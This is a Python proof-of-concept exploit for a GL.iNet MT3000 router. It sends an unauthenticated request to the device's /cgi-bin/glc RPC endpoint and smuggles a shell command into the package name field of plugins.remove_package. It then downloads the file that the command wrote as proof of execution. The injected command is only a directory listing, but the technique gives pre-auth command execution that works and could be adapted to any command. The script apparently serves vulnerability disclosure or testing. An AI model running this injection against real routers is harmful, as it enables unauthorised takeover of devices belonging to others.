#!/usr/bin/env python3
import argparse
import json
import re

import requests


SAFE_PATH_RE = re.compile(r"^/[A-Za-z0-9_./-]*$")


def glc(base, payload, timeout=8):
    response = requests.post(
        f"{base}/cgi-bin/glc",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=timeout,
    )
    response.raise_for_status()
    return response.text


def web_path_for_outfile(outfile):
    if not outfile.startswith("/www/"):
        raise ValueError("--outfile must be under /www so the proof file can be fetched over HTTP")
    return "/" + outfile[len("/www/") :]


def validate_path(label, value):
    if not SAFE_PATH_RE.fullmatch(value):
        raise ValueError(f"{label} must be an absolute path using only letters, digits, _, ., /, or -")


def main():
    parser = argparse.ArgumentParser(
        description="GL.iNet MT3000 plugins.remove_package pre-auth ls file-write PoC"
    )
    parser.add_argument("--target", required=True, help="target router IP or hostname")
    parser.add_argument("--scheme", default="http", choices=["http", "https"])
    parser.add_argument("--list-path", default="/", help="path passed to ls on the router")
    parser.add_argument(
        "--outfile",
        default="/www/glc_remove_package_ls_proof_20260507.txt",
        help="proof file path under /www on the router",
    )
    parser.add_argument("--timeout", type=float, default=8.0)
    args = parser.parse_args()

    validate_path("--list-path", args.list_path)
    validate_path("--outfile", args.outfile)

    base = f"{args.scheme}://{args.target}"
    command = f"ls {args.list_path} > {args.outfile}"
    injected_name = f"abc;{command};#"
    payload = {
        "object": "plugins",
        "method": "remove_package",
        "args": {"name": injected_name},
    }
    proof_url = f"{base}{web_path_for_outfile(args.outfile)}"

    print(f"[+] target: {base}")
    print(f"[+] command: {command}")
    print(f"[+] proof URL: {proof_url}")
    print(f"[+] payload: {json.dumps(payload, ensure_ascii=False)}")

    body = glc(base, payload, timeout=args.timeout)
    print(f"[+] RPC response: {body[:500]}")

    proof = requests.get(proof_url, timeout=args.timeout)
    proof.raise_for_status()
    print("[+] proof file body:")
    print(proof.text)


if __name__ == "__main__":
    main()
